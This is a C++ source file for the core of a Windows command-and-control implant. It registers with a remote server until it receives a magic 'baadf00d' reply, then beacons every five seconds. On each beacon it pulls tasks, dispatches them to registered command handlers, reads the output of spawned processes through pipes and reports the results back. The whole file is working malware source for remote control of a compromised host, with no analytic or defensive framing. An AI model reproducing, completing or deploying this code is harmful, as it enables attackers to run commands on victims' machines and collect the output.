#include "Implant.h"
#include "Command.h"
#include "Channel.h"

IImplant				g_Implant;

BOOL ImplantCheckJobs(json &result);

// ImplantTaskExecute
//
static BOOL ImplantTaskExecute(std::vector<json>& queue, json& result) {
	json	task;
	string	name;
	json	args;
	string	artifact;



	// priority to commands output
	if (queue.empty()) {
		ImplantCheckJobs(result);
		return TRUE;
	}

	if (queue.empty()) {
		return TRUE;
	}

	task = queue.back();
	queue.pop_back();

	if (task.contains("artifact") && !task["artifact"].empty()) {
		artifact = task["artifact"].get<string>();
	}

	if (task.contains("name") && !task["name"].empty()) {
		name = task["name"].get<string>();
	}
	
	if (task.contains("args") && !task["args"].empty()) {
		args = task["args"];
	}

	// dispatch the task to the correct handler
	for (const auto& command : g_CommandRegistry) {
		if (command.Name == name) {
			result["name"] = command.Name;
			command.Invoke(args, artifact, result);
			return TRUE;
		}
	}

	// check if jobs finished
	return FALSE;
}

BOOL ImplantCheckJobs(json &result) {
	LIST_ENTRY* current = g_Implant.JobList.Flink;

	while (current != &g_Implant.JobList) {
		PJOB Job = CONTAINING_RECORD(current, JOB, ListEntry);
		DWORD ExitCode = 0;
		// check if job is done
		if (!GetExitCodeProcess(Job->hProcess, &ExitCode)) {
			printf("GetExitCodeProcess failed: ( %d )\n", GetLastError());
			goto NextNode;
		}

		// check if anything was written to pipe
		if (ExitCode == STILL_ACTIVE) {
			DWORD BytesToRead = 0;
			
			if (!PeekNamedPipe(Job->hAnonPipe, NULL, 0, NULL, &BytesToRead, 0) || !BytesToRead)
			{
				if (GetLastError() == ERROR_BROKEN_PIPE) {
					printf("unexpected process exit\n");

					result["job"] 		= Job->ID;
    				result["output"] 	= "[-] job crashed";
					CloseHandle(Job->hProcess);
    				CloseHandle(Job->hAnonPipe);
					RemoveEntryList(&Job->ListEntry);
					return TRUE;
				}

				goto NextNode;
			}	

			CHAR* Output = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BytesToRead + 1);
			if (!Output) {
				printf("HeapAlloc failed: ( %d )\n", GetLastError());
				goto NextNode;
			}

			if (!ReadFile(Job->hAnonPipe, Output, BytesToRead, NULL, NULL)) {
				printf("ReadFile failed: ( %d )\n", GetLastError());
				goto NextNode;
			}
			
			Output[BytesToRead] = '\0';

			result ["job"] 		= Job->ID;
    		result["output"] 	= Output;    
    		HeapFree(GetProcessHeap(), 0, Output);
			return TRUE;
		
		} else {
			// read all and mark job as done
			DWORD BytesToRead = 0;
			
			if (!PeekNamedPipe(Job->hAnonPipe, NULL, 0, NULL, &BytesToRead, NULL)) {
				if (GetLastError() == ERROR_BROKEN_PIPE) {
					printf("process terminated but unexpected process exit\n");
					result["job"] 		= Job->ID;
    				result["output"] 	= "[-] job crashed";
					CloseHandle(Job->hProcess);
    				CloseHandle(Job->hAnonPipe);
					RemoveEntryList(&Job->ListEntry);
					HeapFree(GetProcessHeap(), 0, Job);

					return TRUE;
				}

				printf("PeekNamedPipe failed: ( %d )\n", GetLastError());
				return FALSE;
			}
			
			CHAR* Output = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BytesToRead + 1);
			if (!Output) {
				printf("HeapAlloc failed: ( %d )\n", GetLastError());
				goto NextNode;
			}

			if (!ReadFile(Job->hAnonPipe, Output, BytesToRead, NULL, NULL)) {
				printf("ReadFile failed: ( %d )\n", GetLastError());
				goto NextNode;
			}

			Output[BytesToRead] = '\0';

			result["job"] 		= Job->ID;
    		result["output"] 	= Output;    
			CloseHandle(Job->hProcess);
    		CloseHandle(Job->hAnonPipe);
			RemoveEntryList(&Job->ListEntry);

			HeapFree(GetProcessHeap(), 0, Job);
			HeapFree(GetProcessHeap(), 0, Output);
			return TRUE;
		}
NextNode:
		current = current->Flink;
	}

	return FALSE;
}

// ImplantTaskQueue
//
static void ImplantTaskQueue(std::vector<json>& queue, json& tasks) {
	for (const auto& item : tasks) {
		queue.push_back(item);
	}
}

// ImplantTaskSend
// 
static BOOL ImplantTaskSend(json& task, json& response) {
	json    packet;
	CHAR* buffer;
	DWORD   size;

	packet["id"] = g_Implant.SessionID;
	packet["task"] = task;

	auto serialized = packet.dump();

	if (!g_Channel->Interface->Send(g_Channel->Interface->Context, serialized.c_str(), serialized.size(), FALSE)) {
		puts("failed to send request");
		return FALSE;
	}

	// read server response
	if (!g_Channel->Interface->Receive(g_Channel->Interface->Context , &buffer, &size)) {
		puts("failed to read response");
		return FALSE;
	}

	if (!size) {
		return TRUE;
	}

	response = json::parse(buffer);
	HeapFree(GetProcessHeap(), 0, buffer);
	return TRUE;
}

// ImplantRegisterSend
// 
static BOOL ImplantRegisterSend(json& task, json& response) {
	json    packet;
	CHAR* buffer;
	DWORD   size;

	packet["id"] = g_Implant.SessionID;
	packet["task"] = task;

	auto serialized = packet.dump();

	if (!g_Channel->Interface->Send(g_Channel->Interface->Context, serialized.c_str(), serialized.size(), TRUE)) {
		return FALSE;
	}

	// read server response
	if (!g_Channel->Interface->Receive(g_Channel->Interface->Context, &buffer, &size)) {
		return FALSE;
	}

	if (!size) {
		return FALSE;
	}

	response = json::parse(buffer);
	HeapFree(GetProcessHeap(), 0, buffer);
	return TRUE;
}

// ImplantRegister send checkin request to server and register
//
void ImplantRegister() {
	json	checkin;
	json	response;
	string	magic;

	// keep sending checkin task until we get "OK" from server
	while (1) {
		if (!ImplantRegisterSend(checkin, response)) {
			continue;
		}

		magic = response["magic"].get<string>();
		if (!magic.compare("baadf00d"))
			return;
	}
}


// ImplantLoop implant beaconing loop
//
void ImplantLoop() {
	std::vector<json>	queue;
	json				result;
	json				response;

	while (1) {
		ImplantTaskExecute(queue, result);
		ImplantTaskSend(result, response);
		ImplantTaskQueue(queue, response);
		response.clear();
		result.clear();
		Sleep(5000);
	}
}

BOOL ImplantInitialize() {
	
	// Implant interface
	g_Implant.SessionID	= RandomUint32();

	InitializeListHead(&g_Implant.JobList);

	// Initialize channel
	if (!ChannelInitialize()) {
		return FALSE;
	}

	return TRUE;
}